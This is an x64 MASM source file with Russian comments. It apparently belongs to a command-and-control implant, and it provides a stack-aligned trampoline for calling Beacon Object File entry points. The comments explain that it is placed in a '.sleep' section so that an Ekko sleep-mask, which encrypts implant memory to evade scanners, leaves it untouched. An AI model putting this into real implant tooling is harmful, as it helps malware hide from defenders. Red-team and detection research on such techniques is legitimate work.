; bof_call.asm — выравнивание стека перед вызовом BOF entry point.
;
; Размещается в секции .sleep — Ekko не шифрует её во время сна,
; в отличие от .text/.rdata. Весь остальной BOF-код (bof_loader.c)
; тоже находится в .sleep через #pragma code_seg(".sleep").
;
; Без FRAME/.PUSHREG/.ALLOCSTACK/.ENDPROLOG MASM не генерирует .pdata запись.
; Тогда при исключении внутри BOF x64 unwinder не может раскрутить стек через
; эту функцию и убивает процесс — __try/__except в вызывающем коде не срабатывает.
;
; bof_call_aligned(void* ep, const char* args, int args_len)
;   rcx = ep        — void(*)(const char*, int)
;   rdx = args
;   r8d = args_len

; Помещаем функцию в секцию .sleep (не шифруется слип-маской).
; Используем суффикс $z — линкер сольёт в .sleep автоматически (PE $ convention),
; без конфликта атрибутов с C code_seg (CNT_CODE 0x20 vs MEM_EXECUTE|MEM_READ).
sleep_seg SEGMENT ALIGN(16) EXECUTE READ ALIAS(".sleep$z")

bof_call_aligned PROC FRAME
    ; --- прolog: сохраняем нелетучие регистры ---
    ; Порядок .PUSHREG должен точно соответствовать порядку push-инструкций.
    push    rbp
    .PUSHREG rbp
    push    rbx
    .PUSHREG rbx
    push    rsi
    .PUSHREG rsi
    ; Резервируем 8 байт для args_len (3 push = 24 + sub 8 = 32 итого → выровнено).
    sub     rsp, 8
    .ALLOCSTACK 8
    .ENDPROLOG

    ; Сохраняем аргументы в нелетучих регистрах (rcx/rdx/r8 — летучие).
    mov     rbx, rcx              ; rbx = ep
    mov     rsi, rdx              ; rsi = args
    mov     dword ptr [rsp], r8d  ; [rsp+0] = args_len

    ; Сохраняем текущий RSP в rbp *до* выравнивания —
    ; только так можно корректно восстановить его после call.
    mov     rbp, rsp

    ; Выравниваем RSP к кратному 16 и резервируем shadow space (32 байта).
    and     rsp, 0FFFFFFFFFFFFFFF0h
    sub     rsp, 32

    ; Вызываем ep(args, args_len).
    mov     rcx, rsi
    mov     edx, dword ptr [rbp]  ; args_len из стека
    call    rbx

    ; --- эпилог: восстанавливаем RSP из сохранённого значения ---
    mov     rsp, rbp   ; RSP → до and/sub (указывает на args_len)
    add     rsp, 8     ; снимаем резерв args_len

    pop     rsi
    pop     rbx
    pop     rbp
    ret

bof_call_aligned ENDP

sleep_seg ENDS

END
